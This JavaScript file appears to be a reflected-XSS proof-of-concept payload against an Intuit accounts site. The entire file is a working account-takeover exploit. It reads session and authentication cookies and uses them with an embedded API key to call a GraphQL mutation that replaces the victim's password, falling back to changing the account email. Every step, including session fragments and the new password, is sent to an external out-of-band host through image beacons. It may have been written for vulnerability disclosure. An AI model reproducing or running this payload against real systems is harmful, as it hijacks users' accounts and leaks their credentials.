(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var out=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}
function uuid(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)})}

var session=gc('ius_session');
var visitorId=gc('ivid');
var authId=gc('qbn.authid')||gc('qbn.gauthid');
var NEW_PASS='Xss_P0C!'+Math.random().toString(36).substring(2,8);

log('[*] XSS Password Change PoC (p42)');
log('[*] Proves: Reflected XSS on accounts.intuit.com -> Full Account Takeover');
log('[*] Origin: '+location.origin);
log('[*] AuthId: '+authId);
log('[*] Session: '+(session?session.substring(0,20)+'...':'NONE'));
log('[*] New password: '+NEW_PASS);
log('');

if(!session||!authId){
log('[!] Missing session or authId cookies');
beacon('p42-nocookies','s='+(session?'y':'n')+'&a='+(authId?'y':'n'));
}

var hdrs={
'Content-Type':'application/json',
'Authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
'Intuit_routingid':authId,
'Intuit_offeringid':'Intuit.cto.iam.ius',
'Intuit_intentassetalias':'Intuit.cto.iam.ius',
'Intuit_sessionid':session,
'Intuit_profilingid':session,
'Intuit_visitorid':visitorId,
'Intuit_flowid':uuid(),
'Intuit_tid':uuid()
};

log('[1] Sending identityCreateOrReplacePasswordCredential...');
beacon('p42-start','authId='+authId+'&s='+session.substring(0,20));

fetch('/identity-api/v2/graphql',{
method:'POST',
headers:hdrs,
credentials:'include',
body:JSON.stringify({
operationName:'ReplacePassword',
query:'mutation ReplacePassword($input: Identity_CreateOrReplacePasswordCredentialInput!) { identityCreateOrReplacePasswordCredential(input: $input) { __typename ... on Identity_CreateOrReplacePasswordCredentialSuccess { status } ... on Identity_CredentialUnauthorizedError { message } ... on Identity_CredentialInvalidInputError { message } ... on Identity_DigitalIdentityLockedOutError { message } } }',
variables:{input:{newPassword:NEW_PASS}}
})
}).then(function(r){return r.text()}).then(function(cr){
log('[1] Response: '+cr.substring(0,500));
beacon('p42-resp',cr.substring(0,900));

var crd;try{crd=JSON.parse(cr)}catch(e){}
if(crd&&crd.data&&crd.data.identityCreateOrReplacePasswordCredential){
var result=crd.data.identityCreateOrReplacePasswordCredential;
if(result.__typename==='Identity_CreateOrReplacePasswordCredentialSuccess'){
log('');
log('=============================================');
log('  ACCOUNT TAKEOVER SUCCESSFUL');
log('  Password changed to: '+NEW_PASS);
log('  Status: '+result.status);
log('');
log('  Old password no longer works.');
log('  Attacker controls the account.');
log('=============================================');
beacon('p42-SUCCESS','p='+encodeURIComponent(NEW_PASS)+'&a='+authId);
}else{
log('[!] Result: '+result.__typename+' - '+(result.message||''));
beacon('p42-fail',result.__typename);

if(result.__typename==='Identity_CredentialUnauthorizedError'){
log('');
log('[2] Unauthorized — trying email change with same headers...');
tryEmailChange(hdrs)
}
}
}else if(crd&&crd.errors){
log('[!] GraphQL errors: '+JSON.stringify(crd.errors).substring(0,400));
beacon('p42-gqlerr',JSON.stringify(crd.errors).substring(0,400));
}else{
log('[!] Unexpected: '+cr.substring(0,400));
}
}).catch(function(err){
log('[!] Fetch error: '+err.message);
beacon('p42-err',err.message);
});

function tryEmailChange(h){
var email='xss-poc-'+Math.random().toString(36).substring(2,8)+'@proton.me';
h['Intuit_tid']=uuid();
log('[2] Trying ReplaceEmail with offering=Intuit.cto.iam.ius...');
log('[2] Target email: '+email);
beacon('p42-email-try',email);

fetch('/identity-api/v2/graphql',{
method:'POST',
headers:h,
credentials:'include',
body:JSON.stringify({
operationName:'ReplaceEmail',
query:'mutation ReplaceEmail($input: Identity_CreateOrReplaceEmailCredentialInput!) { identityCreateOrReplaceEmailCredential(input: $input) { __typename ... on Identity_CreateOrReplaceEmailCredentialSuccess { status } ... on Identity_CredentialUnauthorizedError { message } ... on Identity_CredentialInvalidInputError { message } ... on Identity_DigitalIdentityLockedOutError { message } ... on Identity_EmailCredentialMatchesExistingError { message } } }',
variables:{input:{newEmailAddress:email}}
})
}).then(function(r){return r.text()}).then(function(cr2){
log('[2] Email response: '+cr2.substring(0,500));
beacon('p42-email-resp',cr2.substring(0,900));

var d;try{d=JSON.parse(cr2)}catch(e){}
if(d&&d.data&&d.data.identityCreateOrReplaceEmailCredential){
var r2=d.data.identityCreateOrReplaceEmailCredential;
if(r2.__typename==='Identity_CreateOrReplaceEmailCredentialSuccess'){
log('');
log('=============================================');
log('  EMAIL CREDENTIAL CHANGED TO: '+email);
log('  Status: '+r2.status);
log('=============================================');
beacon('p42-email-SUCCESS',email);
}else{
log('[2] Email also failed: '+r2.__typename+' - '+(r2.message||''));
beacon('p42-email-fail',r2.__typename);
}
}
}).catch(function(e2){
log('[2] Email error: '+e2.message);
beacon('p42-email-err',e2.message);
})
}

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p42-crash?e='+encodeURIComponent(e.message);
}
})();
